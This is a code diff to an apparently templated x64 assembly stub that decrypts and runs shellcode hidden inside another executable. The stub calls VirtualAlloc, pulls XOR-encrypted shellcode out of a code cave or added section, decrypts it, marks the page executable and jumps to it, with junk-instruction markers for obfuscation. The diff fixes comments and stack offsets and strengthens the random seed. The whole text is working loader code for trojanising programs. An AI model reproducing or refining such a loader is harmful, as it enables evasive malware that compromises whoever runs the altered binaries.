@@ -270,13 +270,13 @@ entry:
 // ================================ prepare memory page ================================
 
   // allocate memory for shellcode
-  mov rax, [rsp+0x10]                          {{igi}} // address of VirtualAddress
+  mov rax, [rsp+0x10]                          {{igi}} // address of VirtualAlloc
   xor rcx, rcx                                 {{igi}} // lpAddress
   mov rdx, {{hex .MemRegionSize}}              {{igi}} // dwSize
   mov r8, 0x3000                               {{igi}} // flAllocationType MEM_RESERVE|MEM_COMMIT
   mov r9, 0x04                                 {{igi}} // flProtect PAGE_READWRITE
   sub rsp, 0x20                                {{igi}} // reserve stack for call convention
-  call rax                                     {{igi}} // call GetProcAddress
+  call rax                                     {{igi}} // call VirtualAlloc
   add rsp, 0x20                                {{igi}} // restore stack for call convention
 
   // store allocated memory address
@@ -286,6 +286,7 @@ entry:
   mov {{.RegV.rdx}}, rax                       {{igi}}
   mov {{.RegV.rcx}}, {{hex .EntryOffset}}      {{igi}}
   // calculate a random seed from registers
+  add {{.RegV.rax}}, rsp                       {{igi}}
   add {{.RegV.rax}}, {{.Reg.rbx}}              {{igi}}
   add {{.RegV.rax}}, {{.Reg.rcx}}              {{igi}}
   add {{.RegV.rax}}, {{.Reg.rdx}}              {{igi}}
@@ -312,7 +313,7 @@ entry:
   mov r8, 0x40                                 {{igi}} // flNewProtect PAGE_EXECUTE_READWRITE
   mov r9, rsp                                  {{igi}} // lpflOldProtect
   sub rsp, 0x20                                {{igi}} // reserve stack for call convention
-  call rax                                     {{igi}} // call GetProcAddress
+  call rax                                     {{igi}} // call VirtualProtect
   add rsp, 0x20                                {{igi}} // restore stack for call convention
   add rsp, 0x10                                {{igi}} // restore stack for old protect
 
@@ -320,12 +321,12 @@ entry:
 
 {{if .CodeCave}}
   // extract encrypted shellcode from code cave
-  push {{.RegN.rdi}}                           {{igi}} // save "rdi"
+  push {{.RegN.rdi}}                           {{igi}} // save "rdi" for execute shellcode
   mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}     {{igi}} // key of encrypted shellcode
   mov {{.RegN.rdi}}, [rsp+0x10]                {{igi}} // address of allocated memory page
   add {{.RegN.rdi}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
   {{STUB CodeCaveMode STUB}}
-  pop {{.RegN.rdi}}                            {{igi}} // restore "rdi"
+  pop {{.RegN.rdi}}                            {{igi}} // restore "rdi" for execute shellcode
 {{end}} // CodeCave
 
 {{if or .ExtendSection .CreateSection}}
@@ -346,13 +347,9 @@ entry:
   dec {{.RegV.rcx}}                            {{igi}}
   jnz loop_extract                             {{igi}}
 
-  // restore rdi and rsi
-  pop rdi                                      {{igi}}
-  pop rsi                                      {{igi}}
-
   // decrypt shellcode in the memory page
   mov {{.RegV.rax}}, {{hex .ShellcodeKey}}     {{igi}} // key of encrypted shellcode
-  mov {{.RegV.rdx}}, [rsp+0x08]                {{igi}} // address of allocated memory page
+  mov {{.RegV.rdx}}, [rsp+0x18]                {{igi}} // address of allocated memory page
   add {{.RegV.rdx}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
   mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}    {{igi}} // set loop times
  loop_decrypt:
@@ -365,6 +362,10 @@ entry:
   add {{.RegV.rdx}}, 8                         {{igi}}
   sub {{.RegV.rcx}}, 8                         {{igi}}
   jnz loop_decrypt                             {{igi}}
+
+  // restore rdi and rsi
+  pop rdi                                      {{igi}}
+  pop rsi                                      {{igi}}
 {{end}} // SectionMode
 
 // ================================== execute shellcode ==================================
@@ -419,6 +420,7 @@ entry:
   mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}    {{igi}} // set loop times
   sub {{.RegV.rcx}}, 7                         {{igi}} // adjust loop times
   // calculate a random seed from registers
+  add {{.RegV.rax}}, rsp                       {{igi}}
   add {{.RegV.rax}}, {{.Reg.rbx}}              {{igi}}
   add {{.RegV.rax}}, {{.Reg.rcx}}              {{igi}}
   add {{.RegV.rax}}, {{.Reg.rdx}}              {{igi}}
